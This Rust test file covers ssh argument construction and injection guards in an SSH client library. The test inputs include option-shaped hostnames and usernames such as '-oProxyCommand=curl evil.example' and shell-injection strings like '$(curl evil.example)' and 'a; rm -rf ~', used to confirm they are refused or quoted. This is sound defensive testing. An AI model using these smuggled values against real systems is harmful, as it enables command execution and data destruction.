//! argv construction and the argument-injection guard.

use bhterm_core::model::{AuthMethod, Host};
use bhterm_core::ssh::{self, ControlMaster, SshSafetyError};
use std::path::Path;

fn pair(args: &[String], flag: &str, value: &str) -> bool {
    args.windows(2).any(|w| w[0] == flag && w[1] == value)
}

fn host() -> Host {
    Host::new("Prod", "example.com", "root")
}

#[test]
fn terminal_ends_with_the_destination_after_a_double_dash() {
    let args = ssh::build_terminal(&host(), None, None).unwrap();
    assert_eq!(&args[args.len() - 2..], &["--".to_string(), "root@example.com".into()]);
}

#[test]
fn keepalives_are_always_present() {
    // Without them a dropped network leaves the shared connection alive with
    // a dead TCP socket, and every later session — including a manual
    // reconnect — hangs on it until the app is restarted.
    for args in [
        ssh::build_terminal(&host(), None, None).unwrap(),
        ssh::build_sftp(&host(), None, None).unwrap(),
    ] {
        assert!(pair(&args, "-o", "ServerAliveInterval=15"));
        assert!(pair(&args, "-o", "ServerAliveCountMax=3"));
        assert!(pair(&args, "-o", "TCPKeepAlive=yes"));
        assert!(pair(&args, "-o", "ConnectTimeout=20"));
    }
}

#[test]
fn port_key_and_jump_are_passed_through() {
    let mut h = host();
    h.port = 2222;
    h.auth_method = AuthMethod::PrivateKey { path: "/keys/id_ed25519".into() };
    let mut jump = Host::new("Bastion", "bastion.example.com", "jump");
    jump.port = 2200;

    let args = ssh::build_terminal(&h, Some(&jump), None).unwrap();
    assert!(pair(&args, "-p", "2222"));
    assert!(pair(&args, "-i", "/keys/id_ed25519"));
    assert!(pair(&args, "-J", "jump@bastion.example.com:2200"));

    // Port 22 is the default and stays off the command line.
    assert!(!ssh::build_terminal(&host(), None, None).unwrap().contains(&"-p".to_string()));
}

#[test]
fn sftp_requests_the_subsystem_and_never_becomes_the_master() {
    let args = ssh::build_sftp(&host(), None, None).unwrap();
    assert_eq!(
        &args[args.len() - 4..],
        &["-s".to_string(), "--".into(), "root@example.com".into(), "sftp".into()]
    );
    assert!(pair(&args, "-o", "BatchMode=yes"));
    assert!(!args.iter().any(|a| a == "ControlMaster=auto"));
}

#[test]
fn multiplexing_is_requested_only_where_the_platform_has_it() {
    let dir = std::path::PathBuf::from("/tmp/bhterm-cm");
    let cm = ControlMaster { socket_dir: Path::new(&dir) };
    let args = ssh::build_terminal(&host(), None, Some(&cm)).unwrap();

    if ssh::multiplexing_supported() {
        assert!(args.iter().any(|a| a == "ControlMaster=auto"));
        assert!(args.iter().any(|a| a.starts_with("ControlPath=")));
    } else {
        // Windows OpenSSH has no ControlMaster; passing it would make ssh
        // fail outright, so the options must be absent entirely.
        assert!(!args.iter().any(|a| a.starts_with("ControlPath=")));
        assert!(!args.iter().any(|a| a == "ControlMaster=auto"));
        assert!(ssh::build_exit_master(&host(), None, &cm).unwrap().is_none());
    }
}

#[test]
fn option_shaped_values_are_refused_not_escaped() {
    // A username of `-oProxyCommand=…` makes ssh run a command through the
    // shell before authentication.
    let mut evil = Host::new("Evil", "example.com", "-oProxyCommand=touch /tmp/pwned");
    assert_eq!(
        ssh::build_terminal(&evil, None, None).unwrap_err(),
        SshSafetyError::UnsafeUsername("-oProxyCommand=touch /tmp/pwned".into())
    );

    evil = Host::new("Evil", "-oProxyCommand=id", "root");
    assert!(matches!(
        ssh::build_terminal(&evil, None, None),
        Err(SshSafetyError::UnsafeHostname(_))
    ));

    // A jump host rides inside -J and feeds an inner ssh, so it gets the
    // same treatment.
    let jump = Host::new("EvilJump", "bastion.example.com", "-oProxyCommand=id");
    assert!(ssh::build_terminal(&host(), Some(&jump), None).is_err());

    // …and SFTP must not be a way around the guard.
    assert!(ssh::build_sftp(&Host::new("E", "-oX=1", "root"), None, None).is_err());
}

#[test]
fn hostname_and_username_allow_lists() {
    for bad in ["ex ample.com", "example.com;id", "a$(id)b", "host`id`", "h|id", "", "-x"] {
        assert!(!ssh::is_valid_hostname(bad), "{bad} should be rejected");
    }
    for good in ["example.com", "10.0.0.5", "[fe80::1%en0]"] {
        assert!(ssh::is_valid_hostname(good), "{good} should be accepted");
    }
    assert!(ssh::is_valid_username("deploy_user-1.svc"));
    assert!(!ssh::is_valid_username("a b"));
}

// ── port forwards ──────────────────────────────────────────────────────────

fn rule(kind: bhterm_core::TunnelKind) -> bhterm_core::TunnelRule {
    bhterm_core::TunnelRule {
        id: uuid::Uuid::new_v4(),
        name: String::new(),
        kind,
        listen_host: "127.0.0.1".into(),
        listen_port: 8080,
        dest_host: "10.0.0.5".into(),
        dest_port: 80,
        enabled: true,
    }
}

#[test]
fn forward_specs_match_ssh_s_own_syntax() {
    use bhterm_core::TunnelKind;

    let local = ssh::build_tunnel(&host(), None, &rule(TunnelKind::Local), None).unwrap();
    assert!(pair(&local, "-L", "127.0.0.1:8080:10.0.0.5:80"), "{local:?}");

    let remote = ssh::build_tunnel(&host(), None, &rule(TunnelKind::Remote), None).unwrap();
    assert!(pair(&remote, "-R", "127.0.0.1:8080:10.0.0.5:80"), "{remote:?}");

    // A SOCKS proxy has no destination — naming one would be meaningless.
    let dynamic = ssh::build_tunnel(&host(), None, &rule(TunnelKind::Dynamic), None).unwrap();
    assert!(pair(&dynamic, "-D", "127.0.0.1:8080"), "{dynamic:?}");
    assert!(!dynamic.iter().any(|a| a.contains("10.0.0.5")));
}

#[test]
fn a_forward_carries_no_remote_command_and_ends_at_the_destination() {
    let args = ssh::build_tunnel(&host(), None, &rule(bhterm_core::TunnelKind::Local), None).unwrap();
    assert!(args.contains(&"-N".to_string()), "a forward runs no command: {args:?}");
    assert_eq!(&args[args.len() - 2..], &["--".to_string(), "root@example.com".into()]);
}

#[test]
fn a_forward_joins_the_shared_connection_but_never_becomes_its_master() {
    let dir = Path::new("/tmp/bhterm-test-cm");
    let cm = ControlMaster { socket_dir: dir };
    let args = ssh::build_tunnel(&host(), None, &rule(bhterm_core::TunnelKind::Local), Some(&cm)).unwrap();

    if ssh::multiplexing_supported() {
        assert!(
            pair(&args, "-o", &format!("ControlPath={}", dir.join("%C").display())),
            "a forward on a host with a live terminal must not log in again: {args:?}"
        );
        // A forward outliving the session that authenticated it is not what
        // closing the tab is supposed to mean.
        assert!(!args.iter().any(|a| a.starts_with("ControlMaster")), "{args:?}");
        assert!(!args.iter().any(|a| a.starts_with("ControlPersist")), "{args:?}");
    } else {
        // Windows OpenSSH has no multiplexing; passing the options would make
        // ssh fail outright.
        assert!(!args.iter().any(|a| a.starts_with("ControlPath")), "{args:?}");
    }
}

#[test]
fn a_forward_refuses_an_option_shaped_hostname() {
    let mut h = host();
    h.hostname = "-oProxyCommand=curl evil.example".into();
    assert!(matches!(
        ssh::build_tunnel(&h, None, &rule(bhterm_core::TunnelKind::Local), None),
        Err(SshSafetyError::UnsafeHostname(_))
    ));
}

// ── running a command on the remote host ───────────────────────────────────

#[test]
fn shell_quoting_survives_the_names_that_matter() {
    use bhterm_core::ssh::shell_quote;

    assert_eq!(shell_quote("notes.txt"), "'notes.txt'");
    assert_eq!(shell_quote("my file.txt"), "'my file.txt'");
    // The whole point: a crafted name must arrive as a NAME.
    assert_eq!(shell_quote("a; rm -rf ~"), "'a; rm -rf ~'");
    assert_eq!(shell_quote("$(curl evil.example)"), "'$(curl evil.example)'");
    assert_eq!(shell_quote("`id`"), "'`id`'");
    assert_eq!(shell_quote("a\nb"), "'a\nb'");
    assert_eq!(shell_quote("--force"), "'--force'");
    // A single quote closes, escapes and reopens.
    assert_eq!(shell_quote("it's"), r#"'it'\''s'"#);
    assert_eq!(shell_quote("''"), r#"''\'''\'''"#);
}

#[test]
fn a_quoted_name_cannot_break_out_of_its_command() {
    use bhterm_core::ssh::shell_quote;

    // Build a command the way the file pane does, then check the dangerous
    // text is inside quotes rather than sitting in command position.
    let cmd = format!("cd {} && tar -czf {} {}",
        shell_quote("/var/www"),
        shell_quote("out.tar.gz"),
        shell_quote("a'; rm -rf /; echo '"));
    assert_eq!(
        cmd,
        r#"cd '/var/www' && tar -czf 'out.tar.gz' 'a'\''; rm -rf /; echo '\'''"#
    );
    // Exactly three `&&`/`;` sequences outside quotes would be a disaster;
    // the only unquoted operator is the one we wrote.
    assert_eq!(cmd.matches("&&").count(), 1);
}

#[test]
fn exec_passes_the_command_as_a_single_argument() {
    let args = ssh::build_exec(&host(), None, None, "cd '/tmp' && tar -czf 'a.tgz' 'b'").unwrap();
    assert_eq!(args[args.len() - 2], "root@example.com");
    assert_eq!(args[args.len() - 1], "cd '/tmp' && tar -czf 'a.tgz' 'b'");
    assert!(pair(&args, "-o", "BatchMode=yes"), "{args:?}");
    assert!(args.contains(&"--".to_string()));
}

#[test]
fn exec_refuses_an_option_shaped_hostname() {
    let mut h = host();
    h.hostname = "-oProxyCommand=curl evil.example".into();
    assert!(matches!(
        ssh::build_exec(&h, None, None, "true"),
        Err(SshSafetyError::UnsafeHostname(_))
    ));
}

// ── asking about, and living without, the shared connection ────────────────

/// The master check must name the SAME socket the terminal opened. The port
/// is part of ssh's `%C` hash, so leaving it out makes a check (or an exit)
/// for a non-default port look for a connection that was never there.
#[test]
fn master_check_and_exit_carry_the_port_the_terminal_used() {
    if !ssh::multiplexing_supported() {
        return;
    }
    let cm = ControlMaster { socket_dir: Path::new("/tmp/cm") };
    let mut h = host();
    h.port = 2279;
    for (op, args) in [
        ("check", ssh::build_check_master(&h, None, &cm).unwrap().unwrap()),
        ("exit", ssh::build_exit_master(&h, None, &cm).unwrap().unwrap()),
    ] {
        assert!(pair(&args, "-p", "2279"), "{op} must pass the port: {args:?}");
        assert!(pair(&args, "-O", op), "{op}: {args:?}");
        assert!(pair(&args, "-o", "ControlPath=/tmp/cm/%C"));
        assert_eq!(&args[args.len() - 2..], &["--".to_string(), "root@example.com".into()]);
    }
    // And the terminal's own path really is the one they name.
    let terminal = ssh::build_terminal(&h, None, Some(&cm)).unwrap();
    assert!(pair(&terminal, "-p", "2279") && pair(&terminal, "-o", "ControlPath=/tmp/cm/%C"));
    // Default port: no -p at all, exactly like the terminal.
    let plain = ssh::build_check_master(&host(), None, &cm).unwrap().unwrap();
    assert!(!plain.iter().any(|a| a == "-p"));
}

#[test]
fn master_check_is_refused_for_an_option_shaped_host_and_absent_without_multiplexing() {
    let cm = ControlMaster { socket_dir: Path::new("/tmp/cm") };
    let mut bad = host();
    bad.hostname = "-oProxyCommand=evil".into();
    assert!(matches!(ssh::build_check_master(&bad, None, &cm), Err(SshSafetyError::UnsafeHostname(_))));
    if !ssh::multiplexing_supported() {
        assert_eq!(ssh::build_check_master(&host(), None, &cm).unwrap(), None);
    }
}

/// Windows has no connection sharing, so the file pane logs in on its own with
/// the saved password — through askpass, which BatchMode would forbid, and
/// without ever retrying a wrong password.
#[test]
fn a_password_sftp_login_allows_askpass_and_offers_one_attempt_of_one_kind() {
    let args = ssh::build_sftp_password(&host(), None).unwrap();
    assert!(pair(&args, "-o", "BatchMode=no"), "{args:?}");
    assert!(!args.iter().any(|a| a == "BatchMode=yes"), "{args:?}");
    assert!(pair(&args, "-o", "NumberOfPasswordPrompts=1"));
    assert!(pair(&args, "-o", "PubkeyAuthentication=no"));
    assert!(pair(&args, "-o", "PreferredAuthentications=password,keyboard-interactive"));
    // Same shape as the normal SFTP argv: the subsystem, "--", then the target.
    assert_eq!(
        &args[args.len() - 4..],
        &["-s".to_string(), "--".into(), "root@example.com".into(), "sftp".into()]
    );
    // It never opens a master of its own.
    assert!(!args.iter().any(|a| a.contains("ControlMaster")));
    // Keepalives still apply.
    assert!(pair(&args, "-o", "ServerAliveInterval=15"));
}

#[test]
fn a_password_sftp_login_refuses_option_shaped_values() {
    let mut bad = host();
    bad.username = "-oProxyCommand=evil".into();
    assert!(ssh::build_sftp_password(&bad, None).is_err());
    let mut jump = host();
    jump.hostname = "-oProxyCommand=evil".into();
    assert!(ssh::build_sftp_password(&host(), Some(&jump)).is_err());
}

/// ssh hashes `%l%h%p%r%j` into the control path. The check must feed it the
/// SAME port and jump host as the terminal, or it asks about a socket that
/// does not exist (verified against OpenSSH's `ssh -G`: dropping `-J` changes
/// the path). This is the regression a jump host exposed.
#[test]
fn master_check_names_the_same_socket_as_the_terminal_even_through_a_jump_host() {
    if !ssh::multiplexing_supported() {
        return;
    }
    let cm = ControlMaster { socket_dir: Path::new("/tmp/cm") };
    let mut target = host();
    target.port = 2279;
    let mut jump = Host::new("Jump", "198.51.100.1", "jumpuser");
    jump.port = 2222;
    let value_of = |args: &[String], flag: &str| {
        args.windows(2).find(|w| w[0] == flag).map(|w| w[1].clone())
    };
    for with_jump in [None, Some(&jump)] {
        let terminal = ssh::build_terminal(&target, with_jump, Some(&cm)).unwrap();
        for (op, check) in [
            ("check", ssh::build_check_master(&target, with_jump, &cm).unwrap().unwrap()),
            ("exit", ssh::build_exit_master(&target, with_jump, &cm).unwrap().unwrap()),
        ] {
            for flag in ["-p", "-J"] {
                assert_eq!(value_of(&terminal, flag), value_of(&check, flag), "{op} {flag}: {check:?}");
            }
            assert!(check.iter().any(|a| a == "ControlPath=/tmp/cm/%C"));
        }
    }
    // The jump actually appears when there is one.
    let with = ssh::build_check_master(&target, Some(&jump), &cm).unwrap().unwrap();
    assert_eq!(value_of(&with, "-J"), Some("jumpuser@198.51.100.1:2222".to_string()));
}
